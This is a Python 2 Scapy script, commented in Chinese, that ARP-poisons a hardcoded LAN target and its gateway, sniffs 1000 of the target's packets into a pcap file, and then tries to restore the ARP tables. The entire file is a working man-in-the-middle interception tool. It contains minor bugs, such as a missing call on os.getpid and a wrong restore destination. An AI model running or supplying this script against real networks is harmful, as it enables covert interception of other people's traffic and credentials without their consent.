#-*-coding:utf-8-*-
from scapy.all import *
import os
import sys
import threading
import string
import signal
#需嗅探的本地网卡
interact = "eth0"
#目标攻击IP
target_ip = "192.168.2.245"
#网关IP
gatway_ip = "192.168.2.254"
packet_count = 1000

#嗅探的网卡
conf.iface = interact
#关闭输出
conf.verb = 0
def get_mac(ip_address):
    
    responses,unanswered = srp(Ether(dst="01:02:03:04:05:06")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src
    return None

def  restore_target(gatway_ip,gatway_mac,target_ip,target_mac):
    
    print "[*] Restoring target..."
    send(ARP(op=2,psrc=gatway_ip,pdst=gatway_ip,hwdst="01:02:03:04:05:06",hwsrc=gatway_mac),count=5)
    send(ARP(op=2,psrc=gatway_ip,pdst=target_ip,hwdst="01:02:03:04:05:06",hwsrc=target_mac),count=5)
    
    os.kill(os.getpid,sig=signal.SIGINT)
    


def  poison_target(gatway_ip,gatway_mac,target_ip,target_mac):
    
    poison_target = ARP()
    poison_target.op =2
    poison_target.psrc = gatway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac
    
    poison_gatewy = ARP()
    poison_gatewy.op =2
    poison_gatewy.psrc = target_ip
    poison_gatewy.pdst = gatway_ip
    poison_gatewy.hwdst = gatway_mac    
    
    print "[*] Beginning the ARP poison.[CTRL-C to stop]"
    
    #循环不断发送ARP请求
    while True:
        try:
            send(poison_target)
            send(poison_gatewy)
            
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gatway_ip, gatway_mac, target_ip, target_mac)
            
    print "[*] ARP poison attack finised"
    return

print "[*] Setting up %s" % interact

gatway_mac = get_mac(gatway_ip)

if gatway_mac is None:
    print "[!!!] Faile to get gatway MAC.Exiting"
    sys.exit(0)
else:
    print "[*] Gatway %s is at %s" % (gatway_ip ,gatway_mac)
    
target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Faile to get target_mac MAC.Exiting"
    sys.exit(0)
else:
     print "[*] target_mac %s is at %s" % (target_ip ,target_mac)
     #启动偷毒线程
     poison_thread = threading.Thread(target=poison_target, args=(gatway_ip,gatway_mac,target_ip,target_mac))
     poison_thread.start()
     
     try:
         print "[*] Starting sniffer for %d packets" % packet_count
         
         bpf_filter = "ip host %s" % target_ip
         #bpf过滤器
         #iface嗅探网卡
         #count次数
         packets = sniff(count=packet_count, filter=bpf_filter,iface=interact)
         
         #讲铺货的输出到文件
         wrpcap('arper.pcap',packets)
         #还原网络配置
         restore_target(gatway_ip,gatway_mac,target_ip,target_mac)
         
     except KeyboardInterrupt:
         restore_target(gatway_ip,gatway_mac,target_ip,target_mac)
         exit(0)
    